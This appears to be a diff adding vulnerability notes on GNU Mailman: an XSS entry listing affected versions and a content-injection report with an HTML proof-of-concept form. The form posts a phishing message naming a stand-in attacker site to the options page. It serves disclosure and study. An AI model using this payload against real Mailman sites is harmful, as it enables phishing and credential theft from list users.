@@ -1,0 +1,40 @@
+*****************************************************************
+Vulnerable Systems:
+* Mailman versions 2.1.0 up to and including 2.1.8
+
+Immune Systems:
+* Mailman version 2.1.9
+
+XSS
+
+https://forums.cpanel.net/threads/mailman-security-vulns.58973/
+
+*****************************************************************
+Arbitrary Content Injection via the options login page.
+
+(https://www.cvedetails.com/cve/CVE-2018-13796/)
+
+An issue similar to CVE - https://www.cvedetails.com/cve/CVE-2018-13796/ exists at different endpoint & param. It can lead to a phishing attack.
+
+Steps To Reproduce:
+
+1. Copy and save the following HTML code and open it in any browser.
+Code:
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://example.com/mailman/options/mailman" method="POST">
+      <input type="hidden" name="email" value="Your&#32;account&#32;has&#32;been&#32;hacked&#46;&#32;Kindly&#32;go&#32;to&#32;https&#58;&#47;&#47;badsite&#46;com&#32;or&#32;share&#32;your&#32;credentials&#32;at&#32;attacker&#64;badsite&#46;com" />
+      <input type="hidden" name="UserOptions" value="Unsubscribe&#32;or&#32;edit&#32;options" />
+      <input type="hidden" name="language" value="en" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+2. Can be seen there- "Your account has been hacked. Kindly go to https://badsite.com or share your credentials at <email address hidden>" message will be displayed on the screen.
+
+
+
+*****************************************************************
